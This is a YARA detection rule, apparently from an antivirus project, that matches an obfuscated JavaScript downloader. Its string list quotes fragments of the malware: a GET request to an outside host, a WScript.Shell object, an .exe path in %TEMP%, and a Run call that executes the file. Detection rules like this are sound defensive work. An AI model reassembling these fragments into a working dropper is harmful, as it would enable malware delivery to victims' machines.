rule sig_20160330_c8a5d6c576f92bc5125752f65e02e2ef {
  meta:
    description = "datamaliciousorder - file 20160330_c8a5d6c576f92bc5125752f65e02e2ef.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "170fac4e02dbf1dbd255d356258a57f1655ddd371e121ecbc75dca5daa7e8ce4"

  strings:
    $s1  = "_M0[_Y](\"GET\", \"http://ccluke.cn/b7eus\", false);" fullword ascii
    $s2  = "var _W = function _I() {return WScript[_TL](\"WScript\"+\".Shell\");}(), _N = 11;" fullword ascii
    $s3  = "function _A(_MT, _HV){_O0 = _O0 * 1; return _MT - _HV;};" fullword ascii
    $s4  = "if (_M0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _B(){return _UW + \"\";};" fullword ascii
    $s6  = "function _Z() {return _W[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DVSl1PJBqsz8.ex\" + \"e\";};" fullword ascii
    $s7  = "function _LL() {return ((_DP == true) && (_DP == _X)) ? 1 : _O0;};" fullword ascii
    $s8  = "function _Z0(_RE){_W[\"Run\"](_RE, _O0, _O0);};" fullword ascii
    $s9  = "function _D(){return 22;};" fullword ascii
    $s10 = " while (_IW){" fullword ascii
    $s11 = "function _QB()" fullword ascii
    $s12 = "return _A(_PZ, _R);" fullword ascii
    $s13 = "function _J(_OM) {var _KP = (1, 2, 3, 4, 5, _OM); return _KP;};" fullword ascii
    $s14 = "function _O(){return _TL;};" fullword ascii
    $s15 = "var _O1 = new this[\"Date\"]();" fullword ascii
    $s16 = "var _G = false;" fullword ascii
    $s17 = "var _X = false;" fullword ascii
    $s18 = "_X = true; " fullword ascii
    $s19 = "_DP = true; " fullword ascii
    $s20 = "var _DP = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}